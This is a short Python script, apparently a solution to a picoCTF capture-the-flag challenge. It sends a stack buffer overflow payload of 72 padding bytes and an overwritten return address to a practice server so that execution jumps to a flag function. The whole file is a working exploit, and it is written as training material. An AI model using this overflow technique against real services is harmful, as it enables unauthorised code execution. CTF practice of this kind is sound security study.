import socket
import struct

# Define the host and port
host = 'saturn.picoctf.net'
port =  55444 

# Define the offset and the address of the flag function
offset = 72
flag_address = 0x40123B

# Create a function to send the payload
def send_payload(rip):
    payload = b"A" * offset + struct.pack("<Q", rip) + b"\n"
    with socket.socket() as connection:
        connection.connect((host, port))
        # Receive the initial prompt
        print(connection.recv(4096).decode("utf-8"))
        # Send the payload
        connection.send(payload)
        # Receive and print the response
        response = connection.recv(4096).decode("utf-8")
        print(response)
        return response

# Send the payload with the flag address
response = send_payload(flag_address)
if "dubz{" in response:  # Check if the response contains the flag format
    print(f"Flag found: {response}")
else:
    print("No flag found with this address.")
